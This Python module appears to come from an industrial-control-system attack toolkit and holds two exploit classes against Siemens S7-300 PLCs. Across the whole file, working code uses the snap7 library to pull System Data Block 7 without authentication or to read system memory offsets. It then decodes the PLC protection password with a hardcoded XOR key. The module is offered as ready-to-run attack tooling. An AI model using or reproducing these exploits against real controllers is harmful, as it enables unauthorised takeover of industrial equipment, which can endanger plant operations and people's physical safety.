"""
Siemens S7-300 Password Recovery Exploits

Exploits for recovering passwords from S7-300 series PLCs.
"""

from typing import Any


class S7_300_SDBExtract:
    """
    S7-300 System Data Block (SDB) Extraction

    On older S7-300 firmware, the SDB containing password information
    can be downloaded without authentication.

    The password is stored in SDB 7 with weak XOR obfuscation.

    Affected:
    - S7-300 firmware < V3.2.8
    - S7-300 with certain security configurations
    """

    name = "S7-300 SDB Extraction"
    description = "Extract password from System Data Block 7"
    affected_vendors = ["Siemens"]
    affected_models = ["S7-300", "S7-315", "S7-317", "S7-319"]
    affected_firmware = ["V1.x", "V2.x", "V3.0", "V3.1", "V3.2"]
    cve = None  # No CVE assigned

    # XOR key used in older S7-300 password obfuscation
    XOR_KEY = bytes([0x64, 0xfe, 0x89, 0x3b, 0x21, 0x9a, 0x45, 0xcd])

    def check_applicable(self, target) -> bool:
        """Check if exploit applies to this target"""
        if not target.device:
            return False

        info = target.device.get_device_info()
        model = info.model.lower()

        # Check if S7-300 series
        if 's7-300' not in model and 's7-3' not in model:
            return False

        return True

    def execute(self, target) -> dict[str, Any]:
        """
        Execute the SDB extraction exploit.

        Attempts to:
        1. Download SDB 7 (system data block with protection info)
        2. Parse password from the SDB
        3. De-obfuscate the password using XOR key
        """
        result = {
            'success': False,
            'password': None,
            'message': None,
        }

        if not target.device:
            result['message'] = "No device connection"
            return result

        try:
            # Try to download SDB 7
            # This uses internal snap7 functions
            client = target.device._client

            # Read SDB using raw block upload
            try:
                import snap7
                sdb_data = client.full_upload(snap7.types.Block.SDB, 7)

                if sdb_data and len(sdb_data) > 20:
                    password = self._extract_password(bytes(sdb_data))
                    if password:
                        result['success'] = True
                        result['password'] = password
                        result['message'] = "Password extracted from SDB 7"
                    else:
                        result['message'] = "SDB downloaded but no password found"
                else:
                    result['message'] = "SDB 7 too short or empty"

            except Exception as e:
                # SDB access may be blocked
                result['message'] = f"SDB access denied: {str(e)}"

        except Exception as e:
            result['message'] = f"Exploit failed: {str(e)}"

        return result

    def _extract_password(self, sdb_data: bytes) -> str | None:
        """
        Extract password from SDB 7 data.

        SDB 7 structure (simplified):
        - Offset 0x00: Header
        - Offset 0x10: Protection level byte
        - Offset 0x12: Password start (XOR obfuscated, 8 bytes)
        """
        if len(sdb_data) < 0x1A:
            return None

        # Check protection level
        protection_level = sdb_data[0x10]
        if protection_level < 2:
            # No password protection
            return None

        # Extract password bytes (8 bytes starting at offset 0x12)
        password_bytes = sdb_data[0x12:0x1A]

        # De-obfuscate using XOR key
        decrypted = bytes([
            password_bytes[i] ^ self.XOR_KEY[i % len(self.XOR_KEY)]
            for i in range(len(password_bytes))
        ])

        # Convert to string, strip nulls
        try:
            password = decrypted.decode('ascii').rstrip('\x00')
            if password and password.isprintable():
                return password
        except UnicodeDecodeError:
            pass

        return None


class S7_300_MemoryDump:
    """
    S7-300 Direct Memory Read

    On some S7-300 configurations, the password can be read
    directly from a specific memory location.

    This exploit reads from the system memory area where
    the CPU stores the active session password.
    """

    name = "S7-300 Memory Dump"
    description = "Read password from system memory"
    affected_vendors = ["Siemens"]
    affected_models = ["S7-300", "S7-315", "S7-317"]
    affected_firmware = ["V1.x", "V2.x"]
    cve = None

    def check_applicable(self, target) -> bool:
        """Check if exploit applies"""
        if not target.device:
            return False

        info = target.device.get_device_info()
        return 's7-300' in info.model.lower() or 's7-31' in info.model.lower()

    def execute(self, target) -> dict[str, Any]:
        """
        Execute memory read exploit.

        Attempts to read password from known memory locations.
        """
        result = {
            'success': False,
            'password': None,
            'message': None,
        }

        if not target.device:
            result['message'] = "No device connection"
            return result

        # Known memory locations for password storage
        # These vary by firmware version
        memory_locations = [
            (0x0800, 8),   # System area offset 1
            (0x0810, 8),   # System area offset 2
            (0x1000, 8),   # Alternate location
        ]

        try:
            import snap7
            client = target.device._client

            for offset, length in memory_locations:
                try:
                    # Try reading from system data area
                    data = client.read_area(
                        snap7.types.Areas.SY,  # System area
                        0,
                        offset,
                        length
                    )

                    if data:
                        password = self._try_decode_password(bytes(data))
                        if password:
                            result['success'] = True
                            result['password'] = password
                            result['message'] = f"Password found at offset 0x{offset:04X}"
                            return result

                except Exception:
                    continue

            result['message'] = "No password found in known memory locations"

        except Exception as e:
            result['message'] = f"Memory read failed: {str(e)}"

        return result

    def _try_decode_password(self, data: bytes) -> str | None:
        """Try to decode password from memory data"""
        # Try direct ASCII
        try:
            decoded = data.decode('ascii').rstrip('\x00')
            if decoded and len(decoded) >= 1 and decoded.isprintable():
                return decoded
        except UnicodeDecodeError:
            pass

        # Try with XOR deobfuscation
        xor_key = bytes([0x64, 0xfe, 0x89, 0x3b, 0x21, 0x9a, 0x45, 0xcd])
        decrypted = bytes([
            data[i] ^ xor_key[i % len(xor_key)]
            for i in range(len(data))
        ])

        try:
            decoded = decrypted.decode('ascii').rstrip('\x00')
            if decoded and len(decoded) >= 1 and decoded.isprintable():
                return decoded
        except UnicodeDecodeError:
            pass

        return None
